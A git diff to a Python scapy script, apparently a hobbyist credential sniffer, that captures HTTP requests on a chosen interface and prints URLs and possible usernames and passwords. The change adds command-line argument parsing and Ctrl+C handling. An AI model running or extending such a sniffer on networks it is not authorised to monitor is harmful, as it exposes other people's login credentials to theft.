@@ -1,5 +1,19 @@
 import scapy.all as scapy 
 from scapy.layers import http
+import argparse
+
+
+def get_arguments() -> argparse.Namespace:
+    '''captures and returns the arguments passed by the user'''
+    # initizing object for taking input through argument
+    parser = argparse.ArgumentParser()
+    # options for user input through arguments
+    parser.add_argument("-i", "--interface", dest="interface", help="Interface Name (eq. eth0).")
+    options = parser.parse_args()
+    if not options.interface: # validating user input contains interface or not
+        parser.error("[-] Please specify an Interface Name, use --help for more info.")
+
+    return options
 
 
 def sniff(interface: str) -> None:
@@ -28,7 +42,6 @@ def get_login_info(packet) -> str:
     
 def process_sniffed_packet(packet) -> None:
     '''Takes Packets and Prints it'''
-    print(type(packet))
     # filtering a data from packets
     if packet.haslayer(http.HTTPRequest):
         # print a urls
@@ -40,4 +53,11 @@ def process_sniffed_packet(packet) -> None:
             print(f"\n\n[+] Possible username/password > {login_info}\n\n")        
     
     
-sniff("eth0")
+    
+options = get_arguments()
+try:
+    sniff(options.interface)
+except KeyboardInterrupt:
+    print("[+] Detected CTRL + C .....")
+finally:
+    print("Exited..")
